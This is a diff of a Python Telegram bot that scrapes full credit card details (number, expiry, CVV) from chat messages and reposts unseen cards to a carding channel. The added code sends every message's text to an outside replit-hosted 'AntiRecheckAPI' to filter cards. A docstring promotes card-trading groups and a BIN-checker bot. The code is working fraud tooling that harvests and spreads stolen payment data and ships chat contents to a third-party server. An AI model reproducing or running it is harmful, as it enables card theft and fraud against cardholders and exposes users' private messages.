@@ -1,63 +1,73 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
-import logging
+
+import re
 import os
 import sys
-from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
-from telegram.ext.dispatcher import run_async
-import re
+import logging
+import requests
 from luhn import *
-import pymongo
+from telegram.ext.dispatcher import run_async
+from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
 
-
-
-'''
-This bot is developed by @BARROSOE, it is the first version deployed for public scraping,
-now it is an obsolete version for my work environment, that's why I post it for free.
-
-
----------------Deploy on Heroku
-
--Secret keys: 
-	-TOKEN: 123:ABC
-	- MODE: prod
-	- CHAT_ID_FORWARD: -1111
-	- HEROKU_APP_NAME: (HEROKU APP NAME)
-'''
-
+bot_token = input('BOT TOKEN: ')
+posting_channel = input("CHAT ID TO POST CCS: ")
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
 					level=logging.INFO)
 
 logger = logging.getLogger(__name__)
 
-client = pymongo.MongoClient(
-	
-	)# MONGO DB LINK 
-db = client.credit_cards
+class DB_Connection:
 
-developers = ['878216403']
+	__slots__ = ['connection_text']
 
 
-addusr = ""
-tk = os.getenv("TOKEN")
-mode = os.getenv("MODE")
+	def __init__(self, connection_text: str) -> str:
 
-posting_channel = os.getenv("CHAT_ID_FORWARD")
+		self.connection_text = connection_text
 
-if mode == "dev":
-	def run(updater):
-		updater.start_polling()
-		updater.idle()
-elif mode == "prod":
-	def run(updater):
-		PORT = int(os.environ.get("PORT", "8443"))
-		HEROKU_APP_NAME = os.environ.get("HEROKU_APP_NAME")
-		updater.start_webhook(listen="0.0.0.0", port=PORT, url_path=tk)
-		updater.bot.set_webhook(f"https://{HEROKU_APP_NAME}.herokuapp.com/"+ tk)
-else:
-	sys.exit()
+	@property
+	def database_search(self) ->  dict:
+
+		try:
+			searchbynum = bool(re.findall(r'[0-9]', self.connection_text))
+
+			if searchbynum:
+				query_db = requests.post(
+					'https://plumpdisloyalwatch.jackson0575.repl.co/AntiRecheckAPI/',
+					data={
+						'text_card_query': self.connection_text
+					}
+				).json()
+
+				
+
+				if query_db['Input_CC'] != "NO CC!":
+					if query_db['Result'] == False:
+
+						return {'cc': query_db['Input_CC'], 'post': True}
+					else:
+						return {'cc': query_db['Input_CC'], 'post': False}
+				else:
+					return {'cc': query_db['Input_CC'], 'post': False}
+			else:
+				return {'cc': 'no data logs', 'post': False}
+		except Exception as e:
+
+			print(str(e))
+			return False
+
+'''
+Join To all our networks:
+
+	- @EvilSofiaAI - BOG AI PUBLIC LOGS
+	- @CC_SNIFF_DB - The more biggest & fast cc posting group
+	- @CCDataBaseBot - The most powerful bin checker & provieded bot.
+'''
+
+
 
 @run_async
 def start(update):
@@ -66,81 +76,46 @@ def start(update):
 @run_async
 def extrct(update, context):
 	
-	gex = ['-11111111111'] #To exclude groups from scraping
+	obo = update.message.text
+
+	print(obo)
+	
 
 	try:
-		chat_id = str(update.message.chat_id)
-	except:
-	   pass
-	if  chat_id not in gex:
-		if chat_id == posting_channel:	
-			rawdata = update.message.text
+		check_card_bog_network = DB_Connection(str(obo)).database_search
+		if check_card_bog_network['post']:
 
 
 
-			filtron = "[0-9]{16}[|][0-9]{1,2}[|][0-9]{2,4}[|][0-9]{3}"
-			filtroa = "[0-9]{15}[|][0-9]{1,2}[|][0-9]{2,4}[|][0-9]{4}"
-			detectavisa = "[0-9]{16}"
-			detectamex = "[0-9]{15}"
-			try:
-				try:
-					sacanumvisa = re.findall(detectavisa, rawdata)
-					carduno = sacanumvisa[0]
-					tipocard = str(carduno[0:1])
-				except:
-					sacanumamex = re.findall(detectamex, rawdata)
-					carduno	= sacanumamex[0]
-					tipocard = str(carduno[0:1])
-				if tipocard == "3":
-					x = re.findall(filtroa, rawdata)[0]
-				elif tipocard == "4":
-					x = re.findall(filtron, rawdata)[0]
-				elif tipocard == "5":
-					x = re.findall(filtron, rawdata)[0]
-				elif tipocard == "6":
-					x = re.findall(filtron, rawdata)[0]
-				
-				check_if_cc = db.credit_card.find_one({'cc_num': x.split("|")[0]})
-				try:
-					card_exist_indb = str(check_if_cc['cc_num'])
-					existe = True
-				except:
-					existe = False
+	
 
-				check_luhn = verify(x.split("|")[0])
+			card_beautiful_send = f'''
+CC: <code>{check_card_bog_network["cc"]}</code>
 
-				if existe is False:
-					if check_luhn is True:
-						
-						cc_data = {
-							"bin": x.split("|")[0][:6],
-							"cc_full": x,
-							"cc_num": x.split("|")[0]
-						}
-						db.credit_card.insert_one(cc_data)
-						
-						card_send_formatted = f'''
-CC: {x}
-						'''
+⚠️<b>All Our Automate Network has powered by EvilSofiaAI</b>
+					'''
+			context.bot.send_message(
+				chat_id=posting_channel,
+				text=card_beautiful_send,
+				parse_mode='HTML'
+			)
+	except Exception as e:	
+		print(str(e))
 
-						context.bot.send_message(
-							chat_id=posting_channel,
-							text=card_send_formatted,
-							parse_mode='HTML'
-						)
-			except:
-				pass
 def main():
 
-	updater = Updater(tk, use_context=True)
 
-
+	updater = Updater(bot_token, use_context=True)
 	dp = updater.dispatcher
 
-	dp.add_handler(CommandHandler("start", start))
 	dp.add_handler(MessageHandler(Filters.text, extrct))
-	run(updater)
+
+
+	updater.start_polling()
+	updater.idle()
 
 
 if __name__ == '__main__':
+	
 	main()
+
